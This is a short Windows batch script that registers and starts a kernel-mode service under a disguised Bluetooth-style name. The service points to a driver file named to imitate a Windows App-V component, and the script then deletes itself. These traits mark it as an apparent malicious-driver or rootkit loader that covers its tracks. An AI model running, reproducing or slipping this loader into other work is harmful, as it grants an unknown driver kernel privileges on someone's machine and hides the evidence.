@echo off
cd %~dp0
sc create ServiceBluetoothUser9586 binpath=C:\Windows\System32\drivers\AppvVfsKle.sys type=kernel
sc start ServiceBluetoothUser9586
del "%~f0"